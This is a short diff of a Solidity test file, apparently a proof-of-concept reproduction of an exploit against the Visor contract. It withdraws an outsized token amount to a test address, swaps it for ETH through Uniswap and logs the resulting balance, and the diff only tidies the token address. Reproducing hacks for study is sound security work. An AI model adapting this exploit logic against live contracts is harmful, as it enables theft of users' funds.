@@ -33,11 +33,11 @@ contract VisorExploitTest is Test {
         visor.withdraw(10e24, address(0x7), address(0x7));
 
         address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
-        address visor_token = address(visor.vvisr());
+        address visor_token = address(visor.visr());
         address[] memory path = new address[](2);
-        path[0] = 0xF938424F7210f31dF2Aee3011291b658f872e91e;
+        path[0] = visor_token;
         path[1] = weth;
-        IERC20(0xF938424F7210f31dF2Aee3011291b658f872e91e).approve(address(uniswap), 10e26);
+        IERC20(visor_token).approve(address(uniswap), 10e26);
         uint[] memory amounts = uniswap.swapExactTokensForETH(10e22, 0, path, address(0x7), 2650097619);
         console.log("total eth balance: ", address(0x7).balance);
     }
